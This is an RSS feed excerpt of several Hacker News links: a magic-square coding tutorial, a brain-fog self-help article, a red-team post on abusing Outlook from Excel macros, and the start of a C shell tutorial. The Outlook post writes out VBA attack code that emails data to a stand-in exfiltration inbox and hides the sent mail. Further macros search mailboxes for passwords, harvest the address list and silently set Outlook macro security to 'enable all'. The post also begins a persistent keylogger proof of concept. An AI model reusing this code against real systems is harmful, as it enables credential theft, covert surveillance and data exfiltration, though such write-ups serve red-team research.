                    <span>if</span> x4 <span>in</span> [x1, x2, x3]:
                        <span>continue</span>
                    <span>for</span> x5 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                        <span>if</span> x5 <span>in</span> [x1, x2, x3, x4]:
                            <span>continue</span>
                        <span>for</span> x6 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                            <span>if</span> x6 <span>in</span> [x1, x2, x3, x4, x5]:
                                <span>continue</span>
                            <span>for</span> x7 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                                <span>if</span> x7 <span>in</span> [x1, x2, x3, x4, x5, x6]:
                                    <span>continue</span>
                                <span>for</span> x8 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                                    <span>if</span> x8 <span>in</span> [x1, x2, x3, x4, x5, x6, x7]:
                                        <span>continue</span>
                                    <span>for</span> x9 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                                        <span>if</span> x9 <span>in</span> [x1, x2, x3, x4, x5, x6, x7, x8]:
                                            <span>continue</span>
                                        square <span>=</span> [[x1, x2, x3],
                                                  [x4, x5, x6],
                                                  [x7, x8, x9]]
                                        <span>if</span> is_valid(square, <span>15</span>):
                                            <span>return</span> square
</pre></div></span></p><p>Once we run this code, we notice a massive improvement in performance! Within only a couple of seconds, our algorithm actually finds multiple squares.</p><p>With this new algorithm, we skip all squares which repeat numbers, which will always be invalid. So, we are looping through all permutations. We can expect to run the validation function about $P(10, 9) = 3,628,800$ times, which is much less than the $9^9$ times we had to check last time.</p><p>Now, this method speeds up our code, but by how much? Theoretically, it takes $P(10, 9) * 1.6 \mu\textrm{s} \sim 5.8 \mu\textrm{s}$ to just run all the validations. (We introduced a bunch of ‘if’ statements in between each of the for loops, so it will take a bit longer in reality.) But the point is, our new algorithm works $10,600\%$ faster than the old one!</p><h2>Using a While Loop</h2><p>Still, we have another problem left, and that is the quality of the code. No one wants to have to look at a cascading abyss of for loops and if statements while writing their code, so let’s see if we can combine all this into a single while loop.</p><p>If you think about it, we can treat the square as a list of numbers instead of a list of rows. Instead of $[[1, 2, 3], [4, 5, 6], [7, 8, 9]],$ we can store the array as $[1, 2, 3, 4, 5, 6, 7, 8, 9].$ Now, that means we will need a function to convert the flat list into a square:</p><p><span size="3em"> <!-- HTML generated using hilite.me --><div><pre><span>def</span> <span>arr_to_square</span>(arr):
    side_length <span>=</span> <span>int</span>(<span>len</span>(arr) <span>**</span> <span>0.5</span>)
    <span>return</span> [arr[i:i<span>+</span>side_length] <span>for</span> i <span>in</span> <span>range</span>(<span>0</span>, <span>len</span>(arr), side_length)]
</pre></div></span></p><p>Now, let’s think of how we can structure the while loop. We want the loop to keep going until both the value None is nowhere to be found in the list, and the square is valid. We can use the <code>or</code> operator to run the loop if <code>None</code> is in the square, or the square isn’t valid, like this:</p><p><span size="3em"> <!-- HTML generated using hilite.me --><div><pre><span>def</span> <span>gen_magic_square</span>(size):
    n <span>=</span> get_magic_const(size)
    square <span>=</span> [<span>None</span> <span>for</span> i <span>in</span> <span>range</span>(size<span>**</span><span>2</span>)]
    
    <span>while</span> <span>None</span> <span>in</span> square <span>or</span> <span>not</span> is_valid(arr_to_square(square), n):
        <span>pass</span>
        
    <span>return</span> arr_to_square(square)
</pre></div></span></p><p>You’ll notice I use the function <code>get_magic_const</code>, which computes the magic constant, like this:</p><p><span size="3em"> <!-- HTML generated using hilite.me --><div><pre><span>def</span> <span>get_magic_const</span>(side_length):
    <span>return</span> side_length<span>*</span>(side_length<span>**</span><span>2</span><span>+</span><span>1</span>)<span>/</span><span>2</span>
</pre></div></span></p><p>We will need a variable to store the index of the …</p></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.eurisko.us/solving-magic-squares-using-backtracking/">http://www.eurisko.us/solving-magic-squares-using-backtracking/</a></em></p>]]>
            </description>
            <link>http://www.eurisko.us/solving-magic-squares-using-backtracking/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126652</guid>
            <pubDate>Sat, 13 Feb 2021 20:41:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Strategies to Reduce Brain Fog and Improve Clear Thinking]]>
            </title>
            <description>
<![CDATA[
Score 87 | Comments 90 (<a href="https://news.ycombinator.com/item?id=26126401">thread link</a>) | @evo_9
<br/>
February 13, 2021 | https://thriveglobal.in/stories/want-to-reduce-brain-fog-and-improve-clear-thinking-give-up-these-things-immediately/ | <a href="https://web.archive.org/web/*/https://thriveglobal.in/stories/want-to-reduce-brain-fog-and-improve-clear-thinking-give-up-these-things-immediately/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><div><hr>
<p>Mental fog is often described as a “cloudy-headed” feeling.</p>
<p>Common conditions of brain fog include poor memory, difficulty focusing or concentrating, and struggling with articulation.</p>
<p>Imagine if you could concentrate your brain power into one bright beam and focus it like a laser on whatever you wish to accomplish.</p>
<p>Many people struggle to concentrate. And when you can’t concentrate, everything you do is harder and takes longer than you’d like.</p>
<h3><strong>Give up the&nbsp;clutter</strong></h3>
<p>Mess creates stress.</p>
<p>There’s a strong link between your physical space and your mental space.</p>
<p>Clutter is bad for your mind and health. It can create long-term, low-level anxiety.</p>
<p>When the book, <a rel="nofollow" href="https://amzn.to/2tvOPr0" data-href="http://amzn.to/2tvOPr0" target="_blank"><em>The Japanese Art of Reorganizing and Decluttering</em></a><em>,</em> by Marie Condo became a best-seller, it wasn’t too surprising.</p>
<p>We are all looking for ways to create more meaningful lives with less to distract us.</p>
<blockquote><p><strong><em>Get rid of clutter at your office, on your desk, in your room, and you will send a clear message of calm directly to your brain.</em></strong></p></blockquote>
<p>Start decluttering today in small, focused bursts. You’re not going to clean up your entire space in a day, so start small to make it a daily habit that sticks.</p>
<p>Set yourself up for success by making a plan and targeting specific areas you’re going to declutter, clean up, and organize over a prolonged period of time.</p>
<h3>Multi-tasking doesn’t&nbsp;work</h3>
<p>The ability to multi-task is a false badge of honor.</p>
<p>Task switching has a severe cost.</p>
<p>Your concentration suffers when you multitask.</p>
<p>It compromises how much actual time you spend doing productive work, because you’re continually unloading and reloading the hippocampus/short term memory.</p>
<p>Research shows that tasks switching actually burns more calories and fatigues your brain – reducing your overall capacity for productive thought and work.</p>
<p>Commit to completing one task at a time.</p>
<p>Remove potential distractions (like silencing your mobile, turning off email alerts ) before you start deep work to avoid the temptation to switch between tasks.</p>
<p><strong>Use the 3-to-1 method!</strong></p>
<p>Narrow down your most important tasks to 3, and then give one task your undivided attention for a period of time.</p>
<p>Allow yourself to rotate between the three, giving yourself a good balance of singular focus and variety.</p>
<h3>Give up the urgent distraction</h3>
<p>Disconnect. Your productivity, creativity and next big idea depends on it.</p>
<p>Urgency wrecks productivity. Urgent but unimportant tasks are major distractions.</p>
<p>Last-minute distractions are not necessarily priorities.</p>
<p>Sometimes important tasks stare you right in the face, but you neglect them and respond to urgent but unimportant things.</p>
<p>You need to reverse that. It’s one the only ways to master your time.</p>
<blockquote><p><strong><em>Your ability to distinguish urgent and important tasks has a lot to do with your success.</em></strong></p></blockquote>
<p>Important tasks are things that contribute to your long-term mission, values, and goals. Separating these differences is simple enough to do once, but doing so continually can be tough.</p>
<h3>Stop feeding your&nbsp;comfort</h3>
<p>Comfort provides a state of mental security.</p>
<p>When you’re comfortable and life is good, your brain can release chemicals like dopamine and serotonin, which lead to happy feelings.</p>
<p>But in the long-term, comfort is bad for your brain.</p>
<blockquote><p><strong><em>Without mental stimulation dendrites, connections between brain neurons that keep information flowing, shrink or disappear altogether.</em></strong></p></blockquote>
<p>An active life increases dendrite networks and also increase the brain’s regenerating capacity, known as plasticity.</p>
<p>“Neglect of intense learning leads plasticity systems to waste away,” says Norman Doidge in his book, <a rel="nofollow" href="https://amzn.to/2Fnh3to" data-href="http://amzn.to/2Fnh3to" target="_blank">The Brain That Changes Itself</a>.</p>
<p>Michael Merzenich, a pioneer of plasticity research, and author of <a rel="nofollow" href="https://amzn.to/2oXkPj3" data-href="http://amzn.to/2oXkPj3" target="_blank">Soft-wired: How the New Science of Brain Plasticity Can Change Your Life</a> says that going beyond the familiar is essential to brain health.</p>
<p>“It’s the willingness to leave the comfort zone that is the key to keeping the brain new,” he says.</p>
<p>Seeking new experiences, learning new skills, and opening the door to new ideas inspire us and educate us in a way improves mental clarity.</p>
<h3>Don’t sit&nbsp;still</h3>
<p>Sitting still all day, every day, is dangerous.</p>
<p>Love it or hate it, physical activity can have potent effects on your brain and mood.</p>
<blockquote><p><strong><em>The brain is often described as being “like a muscle”. Its needs to be exercised for better performance.</em></strong></p></blockquote>
<p>Research shows that moving your body can improve your cognitive function.</p>
<p>30–45 minutes of brisk walking, three times a week, can help fend off the mental wear and tear.</p>
<p>What you do with your body impinges on your mental faculties.</p>
<p>Find something you enjoy, then get up and do it. And most importantly, make it a habit.</p>
<h3>Stop consuming media and start creating&nbsp;instead</h3>
<p>It’s extremely easy to consume content.</p>
<p>You are passive. Even relaxed.</p>
<p>But for each piece of unlimited content you consume, it stops a piece of content you could have created.</p>
<p>Limit your mass media consumption.</p>
<p>Embrace the creation habit.</p>
<p>Start paying attention to the noise that you let seep into your eyes and ears.</p>
<p>Ask, Is this benefitting my life in any way?</p>
<p>Does all this information make me more prone to act?</p>
<p>Does it really make me more efficient? Does it move me forward in any significant way?</p>
<p><strong>Let creation determine consumption.</strong></p>
<p>Allow curiosity to lead you to discover and pursue something you deepy care about. Make time to create something unique.</p>
<p>The point is to get lost in awe and wonder like you did when you were a child. When you achieve that feeling from a certain activity, keep doing it!</p>
<p>Share your authentic self with the rest of us.</p>
<h4>Before you&nbsp;go…</h4>
<p>If you enjoyed this post, you will love <a rel="nofollow" href="https://postanly.ongoodbits.com/" data-href="https://postanly.ongoodbits.com" target="_blank">Postanly Weekly</a> (my free digest of the best productivity, behaviour change, and neuroscience posts). <a rel="nofollow" href="https://postanly.ongoodbits.com/" data-href="https://postanly.ongoodbits.com" target="_blank">Subscribe</a> and get a free copy of my new book, “<em>The Power of One Percent Better: Small Gains, Maximum Results”. </em>Join over 40,000 people on a mission to build a better life.</p>
<p><em>Originally published at <a rel="nofollow" href="https://medium.com/personal-growth/want-to-reduce-brain-fog-and-improve-clear-thinking-give-up-these-things-immediately-1bfee44f4dd7">medium.com</a></em></p>
</div></div></div>]]>
            </description>
            <link>https://thriveglobal.in/stories/want-to-reduce-brain-fog-and-improve-clear-thinking-give-up-these-things-immediately/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126401</guid>
            <pubDate>Sat, 13 Feb 2021 20:16:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The worst of the two worlds: Excel meets Outlook]]>
            </title>
            <description>
<![CDATA[
Score 237 | Comments 175 (<a href="https://news.ycombinator.com/item?id=26126067">thread link</a>) | @mooreds
<br/>
February 13, 2021 | https://adepts.of0x.cc/vba-outlook/ | <a href="https://web.archive.org/web/*/https://adepts.of0x.cc/vba-outlook/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content"> <article itemscope="" itemtype="https://schema.org/BlogPosting">  <div itemprop="articleBody"> <p>Dear Fell<strong>owl</strong>ship, today’s homily is the last chapter of our trilogy about our epistolary-daemonic relationship with VBA. This time we are going to talk about how to interact with Outlook from Excel using macros, and also we are going to release a <strong>PoC where we turn Outlook into a keylogger</strong>. Please, take a seat and listen to the story.</p>  <p><em>We promise this is the last time <a href="https://twitter.com/TheXC3LL">@TheXC3LL</a> will publish about VBA. We have scheduled an exorcism this weekend to release his daemons, so he can write again about vulnerabilities and other stuff different to VBA.</em></p>  <p>In our first chapter we talked about the concept of <a href="https://adepts.of0x.cc/kerberoast-vba-macro/">“Hacking in a epistolary way”</a>, where we started to implement attacks and TTPs directly in VBA macros avoiding process injections, dropping binaries or calling external programs that are flagged (like Powershell). This time we are going to shift our focus to Outlook.</p> <p>First of all we have to say that you can interact with Outlook directly from other Microsoft Office apps via VBA using the object <code>Outlook.Application</code>. This means that we can abuse Outlook functionalities from within Excel, so we can look for confidential information inside the inbox or we can exfiltrate data via mails. To send a mail only a few lines are needed:</p> <div><div><pre><code><span>'https://docs.microsoft.com/es-es/office/vba/api/outlook.namespace</span>
<span>Sub</span> <span>send_mail_example</span><span>()</span>
    <span>Dim</span> <span>xOutApp</span> <span>As</span> <span>Object</span>
    <span>Dim</span> <span>xOutMail</span> <span>As</span> <span>Object</span>
    <span>Dim</span> <span>xMailBody</span> <span>As</span> <span>String</span>
    <span>Set</span> <span>xOutApp</span> <span>=</span> <span>CreateObject</span><span>(</span><span>"Outlook.Application"</span><span>)</span>
    <span>Set</span> <span>xOutMail</span> <span>=</span> <span>xOutApp</span><span>.</span><span>CreateItem</span><span>(</span><span>0</span><span>)</span>
    <span>xMailBody</span> <span>=</span> <span>"You did it!"</span>
    <span>On</span> <span>Error</span> <span>Resume</span> <span>Next</span>
    <span>With</span> <span>xOutMail</span>
        <span>.</span><span>To</span> <span>=</span> <span>"exfiltration.inbox@not-phising.cc"</span>
        <span>.</span><span>CC</span> <span>=</span> <span>""</span>
        <span>.</span><span>BCC</span> <span>=</span> <span>""</span>
        <span>.</span><span>Subject</span> <span>=</span> <span>"Macro executed "</span> <span>&amp;</span> <span>Environ</span><span>(</span><span>"username"</span><span>)</span>
        <span>.</span><span>Body</span> <span>=</span> <span>xMailBody</span>
        <span>.</span><span>Send</span>  
    <span>End</span> <span>With</span>
    <span>On</span> <span>Error</span> <span>GoTo</span> <span>0</span>
    <span>Set</span> <span>xOutMail</span> <span>=</span> <span>Nothing</span>
    <span>Set</span> <span>xOutApp</span> <span>=</span> <span>Nothing</span>
<span>End</span> <span>Sub</span>
</code></pre></div></div> <p>If we do not want a copy in the “Sent” folder we can set the property <code>DeleteAfterSubmit</code> as <em>True</em> after we set the <code>Body</code>. This will move directly the mail to the Deleted folder, so it is a bit more stealthy. To fully erradicate the mail we need to locate the mail (as item) inside the Deleted folder and then call the method <a href="https://docs.microsoft.com/es-es/office/vba/api/outlook.items.remove"><code>Remove</code></a> via MAPI.</p>  <p>The object <code>Outlook.Application</code> gives us also access to the namespace <a href="https://docs.microsoft.com/es-es/office/vba/api/outlook.application.getnamespace">MAPI</a> and all its methods. This is important because we can interact with the mail boxes without knowing the credentials. For example, we can use our macro to search all the received mails that contains the word “password” in its body:</p> <div><div><pre><code><span>Sub</span> <span>retrieve_passwords</span><span>()</span>
    <span>Dim</span> <span>xOutApp</span> <span>As</span> <span>Object</span>
    <span>Dim</span> <span>xOutMail</span> <span>As</span> <span>Object</span>
    <span>Dim</span> <span>xMailBody</span> <span>As</span> <span>String</span>
    <span>Set</span> <span>xOutApp</span> <span>=</span> <span>CreateObject</span><span>(</span><span>"Outlook.Application"</span><span>)</span>
    <span>Set</span> <span>outlNameSpace</span> <span>=</span> <span>xOutApp</span><span>.</span><span>GetNamespace</span><span>(</span><span>"MAPI"</span><span>)</span>

    <span>Set</span> <span>myTasks</span> <span>=</span> <span>outlNameSpace</span><span>.</span><span>GetDefaultFolder</span><span>(</span><span>6</span><span>).</span><span>Items</span>
    <span>Dim</span> <span>i</span> <span>As</span> <span>Integer</span>
    <span>i</span> <span>=</span> <span>1</span>
    <span>For</span> <span>Each</span> <span>olMail</span> <span>In</span> <span>myTasks</span>
        <span>If</span> <span>(</span><span>InStr</span><span>(</span><span>1</span><span>,</span> <span>UCase</span><span>(</span><span>olMail</span><span>.</span><span>Body</span><span>),</span> <span>"PASSWORD"</span><span>,</span> <span>vbTextCompare</span><span>)</span> <span>&gt;</span> <span>0</span><span>)</span> <span>Then</span>
            <span>Cells</span><span>(</span><span>i</span><span>,</span> <span>1</span><span>)</span> <span>=</span> <span>olMail</span><span>.</span><span>Body</span> <span>' Here we are just showing the info in the Excel sheets, but you can exfiltrate it as we saw before ;D</span>
            <span>i</span> <span>=</span> <span>i</span> <span>+</span> <span>1</span>
        <span>End</span> <span>If</span>
    <span>Next</span>
    <span>Set</span> <span>xOutMail</span> <span>=</span> <span>Nothing</span>
    <span>Set</span> <span>xOutApp</span> <span>=</span> <span>Nothing</span>
<span>End</span> <span>Sub</span>
</code></pre></div></div> <p>Plaintext passwords inside mailboxes are probably one of the most common sins we are used to see in our engagements. A macro of this kind aimed to the right target can give you the Heaven’s keys.</p> <p>Another interesting information that we can get using MAPI is the Global Address List (GAL). In the address list we can find names, usernames, phone numbers, etc. Here we are just collecting usernames:</p> <div><div><pre><code><span>'https://www.excelcise.org/extract-outlook-global-address-list-details-with-vba/</span>
<span>Sub</span> <span>global_address_list</span><span>()</span>
    <span>Dim</span> <span>xOutApp</span> <span>As</span> <span>Object</span>
    <span>Dim</span> <span>xOutMail</span> <span>As</span> <span>Object</span>
    <span>Dim</span> <span>xMailBody</span> <span>As</span> <span>String</span>
    <span>Set</span> <span>xOutApp</span> <span>=</span> <span>CreateObject</span><span>(</span><span>"Outlook.Application"</span><span>)</span>
    <span>Set</span> <span>outlNameSpace</span> <span>=</span> <span>xOutApp</span><span>.</span><span>GetNamespace</span><span>(</span><span>"MAPI"</span><span>)</span>
    <span>Set</span> <span>outlGAL</span> <span>=</span> <span>outlNameSpace</span><span>.</span><span>GetGlobalAddressList</span><span>()</span>
    <span>Set</span> <span>outlEntry</span> <span>=</span> <span>outlGAL</span><span>.</span><span>AddressEntries</span>
        <span>On</span> <span>Error</span> <span>Resume</span> <span>Next</span>

    <span>'loop through address entries and extract details</span>
    <span>For</span> <span>i</span> <span>=</span> <span>1</span> <span>To</span> <span>outlEntry</span><span>.</span><span>Count</span>
        <span>Set</span> <span>outlMember</span> <span>=</span> <span>outlEntry</span><span>.</span><span>Item</span><span>(</span><span>i</span><span>)</span>
        <span>If</span> <span>outlMember</span><span>.</span><span>AddressEntryUserType</span> <span>=</span> <span>olExchangeUserAddressEntry</span> <span>Then</span>
           <span>Cells</span><span>(</span><span>i</span><span>,</span> <span>1</span><span>)</span> <span>=</span> <span>outlMember</span><span>.</span><span>GetExchangeUser</span><span>.</span><span>Name</span>  
        <span>End</span> <span>If</span>
    <span>Next</span> <span>i</span>
    <span>Set</span> <span>xOutMail</span> <span>=</span> <span>Nothing</span>
    <span>Set</span> <span>xOutApp</span> <span>=</span> <span>Nothing</span>
<span>End</span> <span>Sub</span>
</code></pre></div></div> <p>The main issue is that retrieving this information <strong>can take a really long time</strong> if the company is big (we are talking about ~5-10 minutes), so it is a bit unpractical to be used in a real scenario. However both approaches can be executed <strong>inside</strong> Outlook via OTM files as we will see below.</p>  <p>In the last years various persistence methods related to Outlook were released and implemented in the tool <strong><a href="https://github.com/sensepost/ruler">Ruler</a></strong>. These methods were based on the execution of VBA code via <a href="https://sensepost.com/blog/2017/outlook-forms-and-shells/">Custom Forms</a> and <a href="https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/">Home Pages</a>. Both attacks are now patched, so we have to move forward.</p> <p>Recently <a href="https://twitter.com/domchell">Dominic Chell</a> published the article <a href="https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/">A Fresh Outlook on Mail Based Persistence</a> where the persistence is achieved dropping a <strong>VbaProject.OTM</strong> file that is later loaded by Outlook. This is the path that we choosed here. But instead of using a payload to get a shell or parasite a process with our C2, we are going to create a keylogger in pure VBA <strong>:)</strong>.</p> <p>Outlook is one of the long term alive programs in an average office computer. It is launched since the workday beginning and is not closed until the worker leaves the office, so makes sense to use it as a keylogger. The plan is quite simple: we need to build an Excel file that modifies the registry (so Outlook can execute macros freely) and drops the OTM file with our keylogger.</p> <p>As the registry key is under <code>HKEY_CURRENT_USER</code> we do not need special privileges to modify the value (by default it is set at level 3 <em>Notifications for digitally signed macros, all other macros disabled</em>) so we enable the load and execution of macros by changing the value to 1 (<em>Enable all Macros</em>):</p> <div><div><pre><code><span>Sub</span> <span>disable_macro_security</span><span>()</span>
  <span>Dim</span> <span>myWS</span> <span>As</span> <span>Object</span>
  <span>Set</span> <span>myWS</span> <span>=</span> <span>VBA</span><span>.</span><span>CreateObject</span><span>(</span><span>"WScript.Shell"</span><span>)</span>
  <span>Dim</span> <span>name</span> <span>As</span> <span>String</span><span>,</span> <span>value</span> <span>As</span> <span>Integer</span><span>,</span> <span>stype</span> <span>As</span> <span>String</span>
  <span>name</span> <span>=</span> <span>"HKEY_CURRENT_USER\Software\Microsoft\Office\"</span> <span>&amp;</span> <span>Application</span><span>.</span><span>Version</span> <span>&amp;</span> <span>"\Outlook\Security\Level"</span>
  <span>value</span> <span>=</span> <span>1</span>
  <span>stype</span> <span>=</span> <span>"REG_DWORD"</span>
  <span>myWS</span><span>.</span><span>RegWrite</span> <span>name</span><span>,</span> <span>value</span><span>,</span> <span>stype</span>
<span>End</span> <span>Sub</span>
</code></pre></div></div> <p>We use the Excel version (<code>Application.Version</code>) to calculate the right location of the key to be modified. After that the OTM file can be dropped to <code>Environ("appdata") &amp; "\Microsoft\Outlook\VbaProject.OTM"</code> (it can be packed inside a resource, form, or taken directly from internet and then read/unpack and dropped). It is nothing new, all the good ol’ techniques to drop files apply here, let’s move to the OTM contents and the keylogger.</p> <p>For our keylogger we are going to use the function <strong><code>NtUserGetRawInputData</code></strong> that is not documented in the MSDN. But as usual: if something is not covered by Microsoft, go and check ReactOS. Luckily it is <a href="https://doxygen.reactos.org/d0/dc0/ntstubs_8c.html#ad041c37a6375f9be19cac8f4636d468e">documented</a>:</p> <div><div><pre><code><span>DWORD</span> <span>APIENTRY</span> <span>NtUserGetRawInputData</span> 	<span>(</span> 	<span>HRAWINPUT</span>  	<span>hRawInput</span><span>,</span>
		<span>UINT</span>  	<span>uiCommand</span><span>,</span>
		<span>LPVOID</span>  	<span>pData</span><span>,</span>
		<span>PUINT</span>  	<span>pcbSize</span><span>,</span>
		<span>UINT</span>  	<span>cbSizeHeader</span> 
	<span>)</span> 	
</code></pre></div></div> <p>Also we can see that it is exported by <a href="https://strontic.github.io/xcyclopedia/library/win32u.dll-7D649393F89A9DE3058162F8442130BC.html#win32udll">win32u.dll</a>, so our definition in VBA will be:</p> <div><div><pre><code><span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>NtUserGetRawInputData</span> <span>Lib</span> <span>"win32u"</span> <span>(</span><span>ByVal</span> <span>hRawInput</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>uiCommand</span> <span>As</span> <span>LongLong</span><span>,</span> <span>ByRef</span> <span>pData</span> <span>As</span> <span>Any</span><span>,</span> <span>ByRef</span> <span>pcbSize</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>cbSizeHeader</span> <span>As</span> <span>Long</span><span>)</span> <span>As</span> <span>LongLong</span>
</code></pre></div></div> <p>Our approach will be the well-known technique of creating a window with a callback to snoop messages until we get a <code>WM_INPUT</code> and then use <code>NtUserGetRawInputData</code> to get the input data. To build the structures correctly (like <code>RAWKEYBOARD</code>) we can use <strong><code>offsetof</code></strong> as we described in our article <a href="https://adepts.of0x.cc/vba-tools/">Shedding light on creating VBA macros</a>, so we can check the size of each field and pick VBA types accordingly.</p> <p>Our macro has to be split in two parts</p> <ol> <li>The default module <code>ThisOutlookSession</code></li> <li>Another module created by us that we will rename to <code>Keylogger</code>.</li> </ol> <p>In <code>ThisOutlookSession</code> we only place the trigger that will execute our payload when Outlook starts:</p> <div><div><pre><code><span>Sub</span> <span>Application_Startup</span><span>()</span>
   <span>Keylogger</span><span>.</span><span>launcher</span>
<span>End</span> <span>Sub</span>
</code></pre></div></div> <p>We need to place the “real” payload inside another module to be allowed to use the operator <strong><a href="https://docs.microsoft.com/es-es/office/vba/language/reference/user-interface-help/invalid-use-of-addressof-operator">AddressOf</a></strong>, because we use it to set the callback to our window class. The <code>Keylogger</code> module code (remember: <strong>this is just a PoC</strong> that does not handle errors/exceptions, the intention of this code is just to exemplify how to build one):</p> <div><div><pre><code><span>'This can be hidden using DispCallFunc trick</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>RegisterClassEx</span> <span>Lib</span> <span>"user32"</span> <span>Alias</span> <span>"RegisterClassExA"</span> <span>(</span><span>pcWndClassEx</span> <span>As</span> <span>WNDCLASSEX</span><span>)</span> <span>As</span> <span>Integer</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>CreateWindowEx</span> <span>Lib</span> <span>"user32"</span> <span>Alias</span> <span>"CreateWindowExA"</span> <span>(</span><span>ByVal</span> <span>dwExStyle</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>lpClassName</span> <span>As</span> <span>String</span><span>,</span> <span>ByVal</span> <span>lpWindowName</span> <span>As</span> <span>String</span><span>,</span> <span>ByVal</span> <span>dwStyle</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>x</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>y</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>nWidth</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>nHeight</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>hWndParent</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>hMenu</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>hInstance</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>lpParam</span> <span>As</span> <span>LongPtr</span><span>)</span> <span>As</span> <span>LongPtr</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>DefWindowProc</span> <span>Lib</span> <span>"user32"</span> <span>Alias</span> <span>"DefWindowProcA"</span> <span>(</span><span>ByVal</span> <span>hwnd</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>wMsg</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>wParam</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>lParam</span> <span>As</span> <span>LongPtr</span><span>)</span> <span>As</span> <span>LongPtr</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>GetMessage</span> <span>Lib</span> <span>"user32"</span> <span>Alias</span> <span>"GetMessageA"</span> <span>(</span><span>lpMsg</span> <span>As</span> <span>MSG</span><span>,</span> <span>ByVal</span> <span>hwnd</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>wMsgFilterMin</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>wMsgFilterMax</span> <span>As</span> <span>Long</span><span>)</span> <span>As</span> <span>Long</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>TranslateMessage</span> <span>Lib</span> <span>"user32"</span> <span>(</span><span>lpMsg</span> <span>As</span> <span>MSG</span><span>)</span> <span>As</span> <span>Long</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>DispatchMessage</span> <span>Lib</span> <span>"user32"</span> <span>Alias</span> <span>"DispatchMessageA"</span> <span>(</span><span>lpMsg</span> <span>As</span> <span>MSG</span><span>)</span> <span>As</span> <span>LongPtr</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>GetModuleHandle</span> <span>Lib</span> <span>"kernel32"</span> <span>Alias</span> <span>"GetModuleHandleA"</span> <span>(</span><span>ByVal</span> <span>lpModuleName</span> <span>As</span> <span>String</span><span>)</span> <span>As</span> <span>LongPtr</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>RegisterRawInputDevices</span> <span>Lib</span> <span>"user32"</span> <span>(</span><span>ByRef</span> <span>pRawInputDevices</span> <span>As</span> <span>RAWINPUTDEVICE</span><span>,</span> <span>ByVal</span> <span>uiNumDevices</span> <span>As</span> <span>Integer</span><span>,</span> <span>ByVal</span> <span>cbSize</span> <span>As</span> <span>Integer</span><span>)</span> <span>As</span> <span>Boolean</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>NtUserGetRawInputData</span> <span>Lib</span> <span>"win32u"</span> <span>(</span><span>ByVal</span> <span>hRawInput</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>uiCommand</span> <span>As</span> <span>LongLong</span><span>,</span> <span>ByRef</span> <span>pData</span> <span>As</span> <span>Any</span><span>,</span> <span>ByRef</span> <span>pcbSize</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>cbSizeHead…</span></code></pre></div></div></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://adepts.of0x.cc/vba-outlook/">https://adepts.of0x.cc/vba-outlook/</a></em></p>]]>
            </description>
            <link>https://adepts.of0x.cc/vba-outlook/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126067</guid>
            <pubDate>Sat, 13 Feb 2021 19:35:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tutorial – Write a Shell in C]]>
            </title>
            <description>
<![CDATA[
Score 209 | Comments 48 (<a href="https://news.ycombinator.com/item?id=26126010">thread link</a>) | @mindcrime
<br/>
February 13, 2021 | https://brennan.io/2015/01/16/write-a-shell-in-c/ | <a href="https://web.archive.org/web/*/https://brennan.io/2015/01/16/write-a-shell-in-c/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

  
<p><em>Stephen Brennan • 16 January 2015</em></p><p>It’s easy to view yourself as “not a <em>real</em> programmer.”  There are programs out
there that everyone uses, and it’s easy to put their developers on a pedestal.
Although developing large software projects isn’t easy, many times the basic
idea of that software is quite simple.  Implementing it yourself is a fun way to
show that you have what it takes to be a real programmer.  So, this is a
